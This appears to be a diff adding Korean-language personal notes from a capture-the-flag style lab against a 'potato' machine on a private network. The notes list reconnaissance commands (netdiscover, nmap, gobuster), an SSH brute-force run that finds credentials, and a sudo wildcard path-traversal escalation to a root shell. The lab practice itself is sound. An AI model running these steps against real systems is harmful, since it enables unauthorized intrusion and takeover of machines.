@@ -1,0 +1,36 @@
+0800274FAA6A
+맥주소
+sudo netdiscover -R   
+192.168.16.113
+	otato 주소 확인
+
+sudo nmap -A -v -p- 192.168.16.113
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)
+	0포트 확인
+
+http://192.168.16.113/
+	사이트 접속
+
+sudo gobuster dir -u http://192.168.16.37 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+	>> 하위 디렉토리 탐색
+admin                (Status: 301) [Size: 316] [--> http://192.168.16.113/admin/]
+potato               (Status: 301) [Size: 317] [--> http://192.168.16.113/potato/]
+server-status        (Status: 403) [Size: 279]
+	>> /potato /admin 탐색
+
+
+sudo nmap --script ssh-brute.nse 192.168.16.113
+
+webadmin:dragon
+찾음
+
+sudo -l
+	> (ALL : ALL) /bin/nice /notes/*
+
+>> 이렇게 하니까 * 이게 있음
+
+sudo /bin/nice /notes/../bin/bash
+root 계정 접속
+passwd 
+1234
+
